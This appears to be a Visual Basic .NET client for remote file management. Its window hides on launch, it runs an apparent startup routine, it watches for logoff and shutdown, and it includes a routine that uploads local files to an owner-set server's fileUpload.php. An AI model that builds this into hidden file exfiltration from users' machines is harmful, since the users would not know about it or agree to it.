Imports System.IO.Compression
Public Class Main
    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

#Region "ZipFiles"
    Sub DirToZip(ByVal dirPath As String, ByVal zipPath As String) 'Funciona. 09/04/2022 01:19 AM
        Try
            ZipFile.CreateFromDirectory(dirPath, zipPath, vbNull, True)
        Catch ex As Exception
            AddToLog("DirToZip@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ZipToDir(ByVal zipPath As String, ByVal dirPath As String) 'Funciona. 09/04/2022 01:21 AM
        Try
            ZipFile.ExtractToDirectory(zipPath, dirPath)
        Catch ex As Exception
            AddToLog("ZipToDir@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
#End Region

#Region "FileSystem"
    Sub RenameFile(ByVal filePath As String, ByVal fileName As String)  'Funciona. 09/04/2022 01:24 AM
        Try
            My.Computer.FileSystem.RenameFile(filePath, fileName)
        Catch ex As Exception
            AddToLog("RenameFile@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RenameDirectory(ByVal dirPath As String, ByVal dirName As String) 'Funciona. 09/04/2022 01:25 AM
        Try
            My.Computer.FileSystem.RenameDirectory(dirPath, dirName)
        Catch ex As Exception
            AddToLog("RenameDirectory@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub CopyFile(ByVal filePath As String, ByVal copiedFilePath As String) 'Funciona. 09/04/2022 01:26 AM
        Try
            My.Computer.FileSystem.CopyFile(filePath, copiedFilePath, True)
        Catch ex As Exception
            AddToLog("CopyFile@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CopyDirectory(ByVal dirPath As String, ByVal copiedDirPath As String) 'Funciona. 09/04/2022 01:29 AM
        Try
            My.Computer.FileSystem.CopyDirectory(dirPath, copiedDirPath, True)
        Catch ex As Exception
            AddToLog("CopyDirectory@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub MoveFile(ByVal filePath As String, ByVal newFilePath As String) 'Funciona. 09/04/2022 01:30 AM
        Try
            My.Computer.FileSystem.MoveFile(filePath, newFilePath, True)
        Catch ex As Exception
            AddToLog("CopyDirectory@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub MoveDirectory(ByVal dirPath As String, ByVal newDirPath As String) 'Funciona. 09/04/2022 01:31 AM
        Try
            My.Computer.FileSystem.MoveDirectory(dirPath, newDirPath, True)
        Catch ex As Exception
            AddToLog("MoveDirectory@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
#End Region

    Sub UploadFile(ByVal filePath As String) 'Funciona. 09/04/2022 01:36 AM
        Try
            My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
        Catch ex As Exception
            AddToLog("UploadFile@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
End Class